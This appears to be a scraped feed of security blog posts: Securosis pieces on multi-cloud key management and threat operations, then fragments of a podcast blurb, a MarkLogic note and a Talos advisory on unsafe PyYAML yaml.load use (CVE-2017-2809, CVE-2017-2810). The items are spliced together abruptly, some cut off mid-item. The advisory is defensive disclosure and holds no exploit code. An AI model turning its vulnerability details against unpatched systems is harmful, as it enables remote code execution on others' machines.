<p>We have seen a new take on securing keys and other sensitive data elements in the cloud. We see a small number of organizations distribute secrets across multiple cloud user accounts in the cloud. This model is not limited to key management &#8211; encryption keys may be assigned to individual accounts, but access tokens, certificates, passwords, and other access credentials and configuration data are more common.</p>

<p>The principal use case arose from &#8216;DevOps&#8217; and similar approaches to automating software builds, software testing, and IT deployments. Given the tendency to automate and orchestrate within cloud services, the use of automated software build servers, container management systems and other tools, is gaining traction. These tasks need to run independently, without human intervention, but they need passwords and access certificates. Often developers and IT just put encryption keys and passwords in configuration files, where they are easily stolen. Rather than allow critically sensitive data to sit in unsecured files, these secrets are  better placed in an encrypted &#8216;vault&#8217;. The vault contents can be accessed programmatically, and may be shared by one or more users in a group.</p>

<p>In IaaS clouds the deployment model looks very similar to software based-key management. There are typically one or more servers for users to connect to, with replication performed over a dedicated network connection, database, or even secured file. Why not just use key management? Because it does not address most types of secrets, is not flexile, typically offers more limited API integration capabilities, and is harder to set up than a simple encrypted vault. Simplicity and suitability are the reasons &#8220;secret management&#8221; is gaining traction despite current tools requiring considerable Do It Yourself (DIY) coding and integration. This trend is still an unusual outlier today, but growing quickly as a simple way to solve very real security problems for cloud software development and deployment.</p>

2017-04-13 09:00:00+08:00,Multi-Cloud Key Management: Use Cases,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>This post will cover some issues and concerns customers cite when considering a move &#8211; or more carefully reassessing a move they have <em>already</em> made &#8211; to cloud services.</p>

<p>To provide some context to this discussion, one of the major mental adjustments security folks need to make when moving to cloud services is where their responsibilities begin and end. You are no longer responsible for physical security of cloud systems, and do not control the security of resource pools (<em>e.g.:</em> compute, storage, network), so your areas of concern move &#8220;up the stack&#8221;. With IaaS you control applications, data, user access, and network accessibility. With SaaS, you&#8217;re limited to data and user access. With either you are more limited in the tools at your disposal, either provided natively by your vendor or third-party tools which work with the specific cloud service. The good news is that the cloud shrinks your overall set of responsibilities. Whether or not these are appropriate to your use case is a different question.</p>

<p>Fielding customer calls on data security for the better part of the last decade, we learned inquiries regarding on-premise systems typically start with the data repository. For example, &#8220;I need to protect my database&#8221;, &#8220;My SAN vendor provides encryption, but what threats does that protect us from?&#8221; or &#8220;I need to protect sensitive data on my file servers.&#8221; In these conversations, once we understand the repository and the threats to address, we can construct a data security plan. They usually center on some implementation of encryption with supporting key management, access management, and possibly masking/tokenization technologies. In the cloud encryption is still the primary to tool for data security, but the starting points of conversations have been different. The issues are more about needs than by threats. The following are the main issues cited by customers:</p>

<ul>
<li><strong>PII:</strong> Personally Identifiable Information &#8211; essentially sensitive data specific to a user or customer &#8211; is the top concern. PII includes things like social security numbers, credit card numbers, account numbers, passwords, and other sensitive data types, as defined by various regulations. And it&#8217;s highly very common for what companies move into &#8211; or derive inside &#8211; the cloud to contain sensitive customer information. Other types of sensitive data are present as well, but PII compliance requirements are driving our conversations. The regulation might be GLBA, Mass Privacy Regulation 201 CMR 17, NIST 800-53, FedRAMP, PCI-DSS, HIPAA, or another from the evolving list. The mapping of these requirements to on-premise security controls has always been fuzzy, and the differences have confused many IT staff and external auditors who are accustomed to on-premise systems. Leveraging existing encryption keys and tools helps ensure consistency with existing processes.</li>
<li><strong>Trust:</strong> More precisely, the problem is <em>lack</em> of trust: Some customers simply do not trust their vendor.s Many security pros, having seen security products and platforms fail repeatedly during their careers, view security with a jaundiced eye. They are especially hesitant with security systems they cannot fully audit. Or they do not have faith that cloud vendors&#8217; IT staff cannot access their data. In some cases they do not trust software-based encryption services. Perhaps the customer cannot risk the cloud service provider being forced to turn over encryption keys by court order, or compromised by a nation-state. If the vendor is never provided they keys, they cannot be compelled to turn them over.</li>
<li><strong>Vendor Lock-in and Migration:</strong> A common reservation regards vendor lock-in, and not being able to move to another cloud service provider in case a service fails or the contractual relationship becomes untenable. Some native cloud encryption systems do not allow customer keys to move outside the system, and cloud encryption systems offer proprietary APIs. The goal is to maintain protection regardless of where data resides, moving between cloud vendors as needed.</li>
<li><strong>Jurisdiction:</strong> Cloud service providers, and especially IaaS vendors, offer services in multiple countries, often in more than one region, and with multiple (redundant) data centers. This redundancy is great for resilience, but the concern arises when moving data from one region to another with may have different laws and jurisdictions. For example the General Data Protection Regulation (GDPR) is an EU regulation governing the personal data of EU citizens, and applies to any foreign company regardless of where data is moved. While similar in intent and covered types of data to the US regulation mentioned above under &#8216;PII&#8217;, it further specifies that some citizen data must not be available in foreign countries, or in some data centers. Many SaaS and IaaS security models do not account for such data-centric concerns. Segregation of duties and access controls are augmented in this case by key management.</li>
<li><strong>Consistency:</strong> It&#8217;s common for firms to adopt a &#8220;best of breed&#8221; cloud approach. They leverage multiple IaaS providers, placing each application on the service which best fits the application&#8217;s particular requirements. Most firms are quite familiar with their on-premise encryption and key management systems, so they often prefer to leverage the same tool and skills across multiple clouds. This minimizes process changes around key management, and often application changes to support different APIs.</li>
</ul>

<p>Obviously there nuances of each cloud implementation guide these conversations as well. Not all services are created equally, so what works in one may not be appropriate in another. But the major vendors offer very strong encryption implementations. Concerns such as data exfiltration protection, storage security, volume security, database security, and protecting data in transit can all be addressed with provided tools. That said, some firms cannot fully embrace a cloud native implementation, typically for regulatory or contract reasons. These firms have options to maintain control over encryption keys and leverage cloud native or third-party encryption.</p>

<p>Our next post will go into detail on several deployment options, and then illustrate how they work.</p>

				<p>It&#8217;s hard to believe, but it&#8217;s been 10 years since I published the Pragmatic CSO. Quite a bit has changed in terms of being a senior security professional.

2017-04-10 21:00:00+08:00,Multi-Cloud Key Management (New Series),Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>Running IT systems on public cloud services is a reality for most companies. Just about every company uses Software as a Service to some degree; with many having already migrated back-office systems like email, collaboration, file storage, and customer relationship management software. But we are now also witnessing the core of the data center &#8211; financial systems, databases, supply chain, and enterprise resource planning software &#8211; moving to public Platform and Infrastructure &#8220;as a Service&#8221; (PaaS &amp; IaaS) providers. It&#8217;s common for medium and large enterprises to run SaaS, PaaS, and IaaS at different providers, all in parallel with on-premise systems. Some small firms we speak with no longer have data centers, with all their applications hosted by third parties.</p>

<p>Cloud services offer an alluring cocktail of benefits: they are cost effective, reliable, agile, and <em>secure</em>. While several of these advantages were never in question, security was the last major hurdle for customers. So cloud service providers focused on customer security concerns, and now offer extensive capabilities for data, network, and infrastructure security. In fact most customers can realize as good or better security in the cloud than possible in-house. With the removal of this last impediment we are seeing a growing number of firms embracing IaaS for critical applications.</p>

<p>Infrastructure as a Service means handing over ownership and operational control of your IT infrastructure to a third party. But responsibility for data security does not go along with it. The provider ensures compute, storage, and networking components are secure from external attackers or other tenants in the cloud, but you must protect your data and application access to it. Some of you trust your cloud providers, while others do not. Or you might trust one cloud service but not others. Regardless, to maintain control of your data you must engineer cloud security controls to ensure compliance with internal security requirements as well as regulatory and contractual obligations. In some cases you will leverage security capabilities provided by a cloud vendor, and in others you will bring your own and run them atop the cloud.</p>

<p>Encryption is the &#8216;go-to&#8217; security technology in modern computing. So it should be no surprise that encryption technologies are everywhere in cloud computing. The vast majority of cloud service providers enable network encryption by default to protect data in transit and prevent hijacking. And the majority of cloud providers offer encryption for data at rest to protect files and archives from unwanted inspection by the people who manage the infrastructure or in case data leaks from the cloud service. In many ways encryption is another commodity, and part of the cloud service you pay for. But it is only effective when the encryption keys are properly protected. Just as with on-premise systems, when you move data to cloud services, it is critical to properly manage and secure encryption keys.</p>

<p>Controlling encryption keys &#8211; and by proxy your data &#8211; while adopting cloud services is one of the more difficult tasks when moving to the cloud. In this research series we will discuss challenges specific to multi-cloud key management. We will help you select the right strategy from many possible combinations. For example you need to decide who creates keys (you or your provider), where key are managed (on-premise or in-cloud), how they are stored (hardware or software), policies for how keys will be maintained, how to scale up in a dynamic environment, and how to integrate with each different cloud service model you use (SaaS, PaaS, IaaS, or hybrid). And you still need to either select your own encryption library or invoke your cloud service to encrypt on your behalf. All together, you have a wonderful set of choices to meet any use case, but piecing it all together is a challenge. So we will discuss each of these options, how each customer requirement maps to different deployment options, and what to look for in a key management system.</p>

<p>Our next post will discuss common customer use cases.</p>

2017-03-23 02:26:00+08:00,Introducing Threat Operations: TO in Action,Securosis Blog,"<h3>Posted under: </h3>
				<p>As we wrap up our Introduction to Threat Operations series, let&#8217;s recap. We started by discussing why the way threats are handled hasn&#8217;t yielded the results the industry needs and how to <a href=""https://securosis.com/blog/introducing-threat-operations-thinking-differently"">think differently</a>. Then we delved into what&#8217;s <em>really</em> required to keep pace with increasingly sophisticated adversaries: <a href=""https://securosis.com/blog/introducing-threat-operations-accelerating-the-human"">accelerating the human</a>. To wrap up let&#8217;s use these concepts in a scenario to make them more tangible.</p>

<p>We&#8217;ll tell the story of a high-tech component manufacturer named <em>ComponentCo</em>. Yes, we&#8217;ve been working overtime on creative naming. ComponentCo (CCo) makes products that go into the leading smartphone platform, making their intellectual property a huge target of interest to a variety of adversaries with different motives.</p>

<ul>
<li><strong>Competitors:</strong> Given CCo&#8217;s presence inside a platform that sells hundreds of millions of units a year, the competition is keenly trying to close the technology gap. A design win is worth hundreds of millions in revenue, so it&#8217;s not above these companies to gain parity any way they can.</li>
<li><strong>Stock manipulators:</strong> Confidential information about new products and imminent design wins is gold to unscrupulous traders. But that&#8217;s not the only interesting information. If they can see manufacturing plans or unit projections, they will gain insight into device sales, opening up another avenue to profit from non-public information.</li>
<li><strong>Nation-states:</strong> Many people claim nation-states hack to aid their own companies. That is likely true, but just as attractive is the opportunity to backdoor hundreds of millions of devices by manipulating their underlying components.</li>
</ul>

<p>ComponentCo already invests heavily in security. They monitor critical network segments. They capture packets in the DMZ and data center. They have a solid incident response process. Given the money at stake, they have pretty much every new, shiny object that promises to detect advanced attackers. But they are not naive. They are very clear about how vulnerable they are, mostly due to the sophistication of the various adversaries they face.</p>

<p>As with many organizations, fielding a talented team to execute on their security program is challenging. There is a high-level CISO, as well as enough funding to maintain a team of dozens of security practitioners. But it&#8217;s not enough. So CCo is building a farm team. They recruit experienced professionals, but also high-potential system administrators from other parts of the business who they train in security. Bringing on less experienced folks has had mixed results &#8211; some of them have been able to figure it out, but others haven&#8217;t&#8230; as they expected when they started the farm team. They want to provide a more consistent training and job experience for these junior folks.</p>

<p>Given that backdrop, what should ComponentCo do? They understand the need to think differently about attacks, and how important it is to move past a tactical view of threats to see the threat operation more broadly. They understand this way of looking at threats will help  existing staff reach their potential, and more effectively protect information. This is what that looks like.</p>

<h2>Harness Threat Intel</h2>

<p>The first step in moving to a threat operations mindset is to make better use of threat intelligence, which starts with understanding adversaries. As described above, CCo contends with a variety of adversaries &#8211; including competitors, financially motivated hackers, and nation-states. That&#8217;s a wide array of threats, so CCo decided to purchase a number of threat feeds, each specializing in a different aspect of adversary activities.</p>

<p>To leverage external threat data they aggregate it all into a platform built to reduce, normalize, and provide context. They looked at pumping the data directly into their SIEM, but at this time the flood of external data would have overwhelmed the existing SIEM. So they need yet another product to handle external threat data.</p>

<p>They use their TI platform to alert based on knowledge of adversaries and likely attacks. But these alerts are not smoking guns &#8211; each is only the first step in a threat validation process which sends the alert back to the SIEM looking for supporting evidence of an actual attack. Given their confidence in this threat data, alerts from these sources have higher priority because they match known real-world attacks.</p>

<p>Given what is at stake for CCo, they don&#8217;t want to miss anything. So they also integrate TI into some of their active controls &#8211; notably egress filters, IPS, and endpoint protection. This way they can quarantine devices communicating with known malicious sites or otherwise indicating a compromise <em>before</em> data is lost.</p>

<h2>Enrich Alerts</h2>

<p>We mentioned how an alert coming from the TI platform can be pushed to the SIEM for further investigation. But that&#8217;s only part of the story. The connection between SIEM and TI platform should be bidirectional, so when the SIEM fires an alert, information is pulled from the TI platform which corresponds to the adversary and attack.</p>

<p>In case of an attack on CCo, an alert involving network reconnaissance, brute force password attacks, and finally privilege escalation would clearly indicate an active threat actor. So it would be helpful for the analyst performing initial validation to have access to all the IP addresses the potentially compromised device communicated with over the past week. These addresses may point to a specific bot network, and can provide a good clue to the most likely adversary. Of course it <em>could</em> be a false flag, but it still provides the analyst a head start when digging into the alert.</p>

<p>Additional information useful to an analyst includes known indicators used by this adversary. This information helps to understand how an actor typically operates, and their likely next step. You can also save manual work by including network telemetry to/from the device for clues to whether the adversary has moved deeper into the network. Using destination network addresses you can also have a vulnerability scanner assess other targets to give the analyst what they need to quickly determine if any other devices have been compromised.</p>

<p>Finally, given the indicators seen on the first detected device, internal security data could be mined to look for other instances of that attack regardless of whether network traffic shows the device acting strangely. Then the analyst can tell whether the attacker has been successful using the same tactic to establish other footholds in the environment. This is critical when it&#8217;s time to eradicate an adversary.</p>

<p>This is pretty simple stuff which any semi-experienced analyst does as he/she validates an attack and assesses potential damage. The difference is all this data can be pulled automatically <em>before</em> an alert reaches the analyst. By the time an analyst starts to dig in, they shouldn&#8217;t have to start with a bunch of manual digging to get everything they need to investigate. They start validation in a good position to quickly understand what happened and assess the blast radius of the compromise.</p>

<h2>Building Trustable Automation</h2>

<p>Automation within threat operations can mean a lot of things. Assembling all the supporting information an analyst needs for threat validation prior to starting the process is clearly automation. But let&#8217;s move a little deeper into specific <em>actions</em> which can occur automatically. As described above, ComponentCo has a pretty mature response capability and typically removes all potentially compromised device from the network at the beginning of response to limit possible damage.</p>

<p>But this impacts response in multiple ways. First, it may tip off the adversary, prompting them to burrow deeper and find other points of entry. Additionally, CCo loses their opportunity to monitor adversary activity to figure out what they were trying to do and how.</p>

<p>Automation can help. CCo can automatically move a suspicious device onto a VLAN where all network traffic is captured, which won&#8217;t tip off the adversary to their discovery. They also start to pull EDR telemetry off the device at least every 30 minutes, to ensure data is captured even if the adversary is tampering with endpoint&#8217;s logs. This provides opportunity to see what adversaries are up to, and perhaps to establish preemptive workarounds in anticipation of the attacker&#8217;s next move.</p>

<p>Another step CCo may add to their response playbook is to automatically update a network blacklist with any unknown external networks a compromised device has been communicating with, under the assumption they are likely botnets, and block traffic to them. They can search their network and device security data for other devices connecting to those networks, which can help identify additional compromised devices.</p>

<h2>Workflow and Process Automation</h2>

<p>Underlying all these functions is an <em>automate first</em> mentality, where the team builds playbooks which specify actions to take in response to typical threats. This is valuable for several reasons, including consistent response and minimization of human error. But scaling the security team is the most important. CCo is a very desirable place to work, and doesn&#8217;t generally have an issue finding talented folks, but skilled security staff are still in high demand. By combining a threat operations mindset with a heavy dose of automation, CCo can make less sophisticated (and cheaper) analysts more productive.</p>

<p>Of course they still use Tier 3 analysts to handle tough and complicated incidents. But for others their playbooks can guide Tier 1 &amp; 2 analysts. Let&#8217;s use an example of a response playbook for a phishing issue leads off a targeted attack.</p>

<p>In our scenario a junior staffer in Finance received a phishing email claiming to come from his bank, and requiring immediate attention. The employee fell for the ruse and clicked the link, which compromised his device. The compromised device began internal reconnaissance and connected to a known botnet. At that point an alert triggered and the automated playbook kicked in, putting the device in a fully logged VLAN and increasing the monitoring level, then updating egress filters and the IPS configuration to watch for indicators corresponding to the initial attack. A full image of the device was taken prior to clean-up, and then it was restored and resumed normal operations quickly, without any real data loss or extensive manual effort.</p>

<p>But given the sophistication of its adversaries, CCo doesn&#8217;t assume any phishing attack is just everyday phishing. So they install the image of the compromised device in a sandbox to see what it does. This secondary analysis shows the phishing attack was a diversion. A secondary malware kit activated the next day, which had all of the earmarks of far more sophisticated nation-state malware.</p>

<p>So this gets immediately escalated to Tier 3.</p>

<h2>Handling a Targeted Threat</h2>

<p>Escalation of what appears to be a nation-state level attack triggers yet another playbook, which triggers the threat intel and alert enrichment functions discussed previously. By the time the case reaches a Tier 3 responder, they will quickly understand the adversary, their tactics, and where else similar attacks have been seen &#8211; inside or outside CCo.</p>

<p>At this point the response team knows they are under real attack bt a sophisticated adversary, and automatically starts capturing egress traffic and locking down their most critical assets as a precaution. Because related information has already been collected and associated with this case, the Tier 3 analyst can very quickly figure out the adversary&#8217;s TTPs and choose an appropriate response.</p>

<p>Obviously there is a lot more effort and detail to actually eradicate a nation-state from CCo&#8217;s systems, but they have a response process and playbook for that. The point to highlight here is that what looked like simple phishing, handled in a largely automated fashion, uncovered a sophisticated nation-state campaign. At that point the threat operations mindset enables CCo to seamlessly escalate and provides a Tier 3 analyst with all available information to streamline attack and adversary research, and accelerate both damage assessment and eventual eradication of the adversary.</p>

<p>So what is required for this threat operations mindset?</p>

<ol>
<li><strong>Define processes and playbooks:</strong> Consistent activity requires initial work to figure out appropriate responses for a number of different scenarios. The evolution always starts by defining how you <em>want</em> the team to behave, and then working to implement consistent processes.</li>
<li><strong>Implement an external threat data aggregation platform:</strong> External threat data is key to understanding what adversary you are facing and what they are likely to do. Numerous feeds are available, but to avoid overload and ensure can effectively utilize the data, you&#8217;ll want to aggregate and process it for better context.</li>
<li><strong>Integrate external and internal security data with analytics:</strong> Once aggregated, the external data needs to be analyzed alongside internal security data to pinpoint potential issues and identify patterns of malicious behavior based on what&#8217;s happening in the wild. At this point you get much more relevant alerts, enriched with supporting information about probable adversaries and indications of whether an attack has spread within your environment.</li>
<li><strong>Orchestrate existing monitors and controls:</strong> The key to operationalizing a playbook is to have all the systems work together. So your TI aggregation platform (if a separate technology) needs a bi-directional connection to and from your SIEM. It can also send data to IPS devices and egress filters to block known bad sites. It can check with an advanced endpoint tool to confirm that what is reported from the network actually happened on the endpoint, and vice-versa.</li>
<li><strong>Automate first:</strong> Finally, given all this analysis and integration, trusted automation can block traffic to known bad sites and move compromised devices into quarantine networks or capture telemetry on detection of suspicious activity. Basically, if something can be documented in a playbook, you should be able to automate much of the process.</li>
</ol>

<p>The end result is an orchestrated and automated ability to handle threats, equipping human analysts to do what they do best: pull on threads and make connections between isolated attacks which may represent sophisticated campaigns. Machines don&#8217;t do this well or automatically. If it can be enumerated in a playbook, it likely <em>should</em> be automated. If not it remains the purview of humans on the security team, and you can make them more productive by automatically aggregating the data they need to understand and address each situation.</p>

2017-03-15 01:34:00+08:00,Introducing Threat Operations: Accelerating the Human,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>In <a href=""https://securosis.com/blog/introducing-threat-operations-thinking-differently"">the first post of our Introducing Threat Operations Series</a>, we explored the need for much stronger operational discipline around handling threats. With all the internal and external security data available, and the increasing sophistication of analytics, organizations should be doing a better job of handling threats. If what you are doing isn&#8217;t working, it&#8217;s time to start thinking differently about the problem, and addressing the root causes underlying the inability to handle threats. It comes down to _accelerating the human: making your practitioners better through training, process, and technology.</p>

<p>With all the focus on orchestration and automation in security circles, it&#8217;s easy to conclude that carbon-based entities (yes, people!) are on the way out for executing security programs. That couldn&#8217;t be further from reality. If anything, as the technology infrastructure continues to get more complicated and adversaries continue to improve, humans are <em>increasing</em> in importance. Your best investments are going to be in making your security team more effective and efficient at the ever-increasing tasks and complexity.</p>

<p>One of the keys we discussed in our <em>Security Analytics Team of Rivals</em> series is the need to use the right tool for the job. That goes for humans too. Our security functions need to be delivered via both technology and personnel, letting each do what it does best. The focus of our operational discipline is finding the proper mix to address threats.</p>

<p>Let&#8217;s flesh out <em>Threat Operations</em> with more detail.</p>

<ul>
<li><strong>Harnessing Threat Intelligence:</strong> Enterprises no longer have the luxury of time to learn from attacks they&#8217;ve seen and adapt defenses accordingly. You need to learn from attacks on others by using external threat intelligence to make sure you can detect those attacks, regardless of whether you&#8217;ve seen them previously. Of course you can easily be overwhelmed with external threat data, so the key to harnessing threat intel is to focus only on relevant attacks.</li>
<li><strong>Enriching Alerts:</strong> Once you have a general alert you need to add more information to eliminate a lot of the busy work many analysts need to perform just to figure out whether it is legitimate and critical. The data to enrich alerts exists within your systems &#8211; it&#8217;s just a matter of centralizing it in a place analysts can use it.</li>
<li><strong>Building Trustable Automation:</strong> A set of attacks can be handled without human intervention. Admittedly that set of attacks is pretty limited right now, but opportunities for automation will increase dramatically in the near term. As we have stated for quite a while, the key to automation is <em>trust</em> &#8211; making sure operations people have confidence that any changes you make won&#8217;t crater the environment.</li>
<li><strong>Workflow/Process Acceleration:</strong> Finally, moving from threat management to threat operations requires you to streamline the process and apply structure where sensible to provide leverage and consistency for staff members. It&#8217;s about finding a balance between letting skilled practitioners do their thing and providing the structure necessary to lead a less sophisticated practitioner through a security process.</li>
</ul>

<p>All these functions focus on one result: providing more context to each analyst to accelerate their efforts to detect and address threats in the organization &#8211; <em>Accelerating the Human</em>.</p>

<h2>Harnessing Threat Intelligence</h2>

<p>We have long believed threat intel can be a great equalizer in restoring some balance to the struggle between defender and attacker. For years the table has been slanted toward attackers, who target a largely unbounded attack surface with increasingly sophisticated tools. But sharing data about these attacks and allowing organizations to preemptively look for new attacks <em>before</em> they have been seen by an individual organization can alleviate this asymmetry.</p>

<p>But threat intelligence is an unwieldy beast, involving hundreds of potential data sources (some free and others paid) in a variety of data formats, which need to be aggregated and processed to be useful. Leveraging this data requires several steps:</p>

<ol>
<li><strong>Integrate:</strong> First you need to centralize all your data. Start with external data. If you don&#8217;t eliminate duplicates, ensure accuracy, and ensure relevance, your analysts will waste even more time spinning their wheels on false positives and useless alerts.</li>
<li><strong>Reduce Overlap and Normalize:</strong> With all this data there is bound to be overlap in the attacks and adversaries tracked by different providers. Efficiency demands that you address this duplication before putting your analysts to work. You need to clean up the threat base by finding indicator commonalities and normalizing differences in data provided by various threat feeds.</li>
<li><strong>Prioritize:</strong> Once you have all your threat intel in a central place you&#8217;ll see you have way too much data to address it all in any reasonable timeframe. This is where prioritization comes in &#8211; you need to address the <em>most likely</em> threats, which you can filter out based on your industry and the types of data you are protecting. You need to make some assumptions, which are likely to be wrong, so a functional tuning and feedback loop is essential.</li>
<li><strong>Drill Down:</strong> Sometimes your analysts need to pull on threads within an attack report to find something useful for your environment. This is where human skills come into play. An analyst should be able to drill into intelligence about a specific adversary and threat, to have the best opportunity to spot connections.</li>
</ol>

<p>Threat intel should ultimately, when fed into your security monitors and controls, provide an increasing number of the alerts your team handles. But an alert is only the beginning of the response process, and making each alert as detailed as possible saves analyst time. This is where enrichment enters the discussion.</p>

<h2>Enriching Alerts</h2>

<p>So you have an alert, generated either by seeing an attack you haven&#8217;t personally experienced yet but were watching for thanks to threat intel, or something you were specifically looking for via traditional security controls. Either way, an analyst now needs to take the alert, validate its legitimacy, and assess its criticality <em>in your environment</em>. They need more context for these tasks.</p>

<p>So what would streamline the analyst process of validating and assessing the threat? The most useful tool as they drill into the alert would probably be more information. It&#8217;s useful for prioritization to have a list of attacks associated with unsophisticated attackers, for instance. It&#8217;s also convenient to recognize a set of attacks which target an application stack you don&#8217;t use &#8211; you can point all those indicators at the circular bin.</p>

<p>On the other hand, it matters a lot to an analyst if while investigating an alert they recognize indicators linked to financial fraud, and connect active command and control traffic patterns to a financial fraud botnet. If your organization is concerned about financial fraud (who isn&#8217;t?), this enrichment should bubble relevant alerts to the top for further investigation.</p>

<p>But that&#8217;s just the automated stuff. If the alert is enriched with, say, a list of devices on your network which connected to botnet-associated IP addresses, you have a handy list of devices which might have been impacted by that attack. Or if you can extract from your change management system a list if devices which have added a specific executable, and you learn later that change was part of an attack, you are well ahead of the game in terms of figuring out how an attack proliferated within your environment.</p>

<p>Alert enrichment requires foresight. You need to anticipate the kinds of questions an analyst will ask based on what they find in an alert. Obviously you run the risk of adding too much data, so you&#8217;ll want instrumentation to determine which data is useful and which isn&#8217;t. It helps to have a feedback loop with analysts as well, to continuously track which data is helpful.</p>

<p>With additional context about the severity of each threat in your environment, and types of attack, you can figure out which can be remediated easily and which can&#8217;t. The easy stuff is ripe for automation.</p>

<h2>Building Trustable Automation</h2>

<p>Automation remains a fairly divisive topic in security. Many operational folks are justifiably concerned about machines making changes which could result in downtime. But what choice do you have? You can&#8217;t get all the work done with the resources you have, and bringing very expensive resources to bear on activities which don&#8217;t add value is silly. To bridge the gap we focus on building <em>trust</em> in the automation process.</p>

<p>How can you establish trust? Start small. Select a set of very manageable use cases which make an operational difference but have limited downside. A good place to look is outbound network connections. If you learn of a new phishing site, typically via threat intel, you can have egress filters block connections. Simple, right? But very effective because many phishing sites are only up for a few hours, so having a staffer update the egress filter doesn&#8217;t work &#8211; things move too fast for humans. But it&#8217;s a perfect task for a machine, with limited downside because you&#8217;ll hear about any false positives quickly from impacted employees. And it would likely be a handful of folks &#8211; not the entire Finance department.</p>

<p>Implementing this kind of automation requires determining the trigger, designing the action, and deploying the controls. First you figure out the use case to look for. Maybe the trigger comes from your IDS or SIEM. Or perhaps it comes from a threat operations platform aggregating and analyzing external data. Once you know the data to look for, you set an alert. Once it fires, what happens? You have to design a set of actions, which usually involves changing an active control. Once that is designed you deploy the change to a security control.</p>

<p>Returning to the importance of trust to any kind of automation, you should be able to quickly walk back any change you make in case of unintended consequences. Operations will push back against things which cannot be undone, so make sure your automation is designed with resilience in mind. Don&#8217;t make a series of changes if they cannot all be rolled back gracefully and quickly.</p>

<p>Easy, right? The concept is simple enough, especially for no-brainer use cases. A new set of orchestration and automation tools is emerging to provide a platform for this critical step. But as with most innovative security technology, this function is destined for eventual integration into broader security platforms.</p>

<p>With contextual threat intelligence making alerts more valuable, and then making changes that make sense, where do humans come into play? Not everything fits into a nice clean set of circumstances you can model to build tidy automation, so you need to structure operational process to be both flexible and yet consistent.</p>

<h2>Structuring Activity</h2>

<p>We understand process management is not nearly as sexy as hunting adversaries. But it&#8217;s more important. Security teams face an unprecedented lack of talent to implement and run security programs. So the secret to success is to rapidly improve the effectiveness of less sophisticated practitioners. That&#8217;s a politically correct way of saying you need to make n00bs a bit less n00by.</p>

<p>This entails looking at how a responder does things and implementing the process in a tool. Whether it&#8217;s an assembly line or a bank branch processing a deposit, mature businesses have documented processes which represent best practices. Start by learning how your best folks do their jobs. They have likely learned in the school of hard knocks, but they know what they are doing. Document how they work and use that as the basis for your process.</p>

<p>But you might not have rock stars on your team, or not know where to start. The good news is that many service organizations, as well as some product vendors, already have documented <em>playbooks</em> for many security processes and functions. As with automation, you start small with a fixed set of playbooks. The objective is to develop more, and make them more sophisticated, over time.</p>

<p>Look for opportunities to leverage other aspects of threat operations while implementing playbooks. For example you could develop a quick response process which starts with an alert from your endpoint security suite, enriched with information from your threat intel library, including a set of known malicious networks which can be automatically blocked by your outbound firewall. Then an analyst can dig into the compromised device to figure out exactly what happened, and if any other devices have been impacted.</p>

<p>On the bright side, a very specific set of activities structured this way can be very helpful to practitioners who aren&#8217;t quite sure what to do next. You already instrumented the platform with the ability to perform these functions, so they can follow along to benefit from the best practices research you have performed.</p>

<p>On the downside, you need to define which playbooks to implement, and they don&#8217;t help when you encounter something which they don&#8217;t cover. Fortunately innovation marches on, so soon you will be hearing about &#8220;cognitive security analytics&#8221;, which can make some connections automatically using very advanced analytics. It&#8217;s still quite early for cognitive technology, but it&#8217;s very promising, so that&#8217;s something to keep an eye on.</p>

<p>The first goal for deep thinking about threat operations is to stop reacting so tactically to just one attack at a time &#8211; instead focus on <em>threats</em> to your organization and see the bigger picture. Second, structure consistent operational processes to make less sophisticated practitioners more effective. We will bring these concepts together in our next post, with a scenario to put them into practice.</p>

Craig and Nigel are joined by Bill Largent and Joel was… in a meeting?  The crew discusses ambulance chasing and crying wolf in the security industry and also what the security press is doing to perpetuate questionable reporting.

Marklogic uses this converter each time <a href=""https://docs.marklogic.com/xdmp:pdf-convert"">XDMP API ""pdf-convert""</a> is used.<br /><br />From the <a href=""https://docs.marklogic.com/xdmp:pdf-convert"">documentation</a>’s description of this API:<br /><br /><div style=""text-align: center;""><i>Converts a PDF file to XHTML.

Attackers can exploit these vulnerabilities through supplying malicious YAML content to execute arbitrary commands on vulnerable systems.</div><br /><h2>Overview</h2><br /><div>YAML is a data serialisation markup format which is designed to be readable for humans yet easily parsed by machines. Many tools and libraries have been developed to parse YAML data. The Python YAML parsing library PyYAML provides two API calls to parse YAML data: yaml.load and yaml.safe_load. The former API does not correctly sanitise YAML input which allows attackers to embed Python code to be executed within YAML content.</div><br /><div>Applications which include the PyYAML library and call yaml.load and not yaml.safe_load are vulnerable to remote code execution vulnerabilities.</div><br /><a name=""more""></a> <h3>TALOS-2017-0305 Remote Code Execution Vulnerability in Ansible-Vault Library. (CVE-2017-2809)</h3> <div>Ansible provides an easy solution for automating IT and network based tasks.  For ease of use these tasks are described in YAML. Ansible-Vault is a third party python library for viewing and modifying Ansible Vault files. The vulnerability exists in this third party library when viewing an encrypted vault file. When loading the encrypted YAML code the application calls the unsafe API call yaml.load. This vulnerability allows a malicious user to cause remote code execution in the context of the current user.</div><br /><div>This third party python library is distinct from the core functionality of Ansible Vault provided by Ansible which is not subject to this vulnerability.</div><br /><div>More technical details can be found in the Talos <a href=""http://www.talosintelligence.com/reports/TALOS-2017-0305"">Vulnerability Report </a></div><br /><h3>TALOS-2017-0307 Remote Code Execution Vulnerability in Tablib. (CVE-2017-2810)</h3><div>Tablib is a Python dataset library which allows programs to easily access, write and manage tabular data files. The library itself is widely used inside many applications including the django-import-export application.</div><br /><div>The databook functionality of Tablib includes also includes a call to the unsafe API call yaml.load. This fails to correctly sanitise user supplied YAML code. A malicious user may include arbitrary code within YAML code included in a databook which can executed in the context of the current user.</div><br /><div>More technical details can be found in the Talos <a href=""http://www.talosintelligence.com/reports/TALOS-2017-0307"">Vulnerability Report </a></div><br />  <h2>Coverage</h2><br /><div>The following Snort Rules will detect exploitation attempts of this vulnerability.

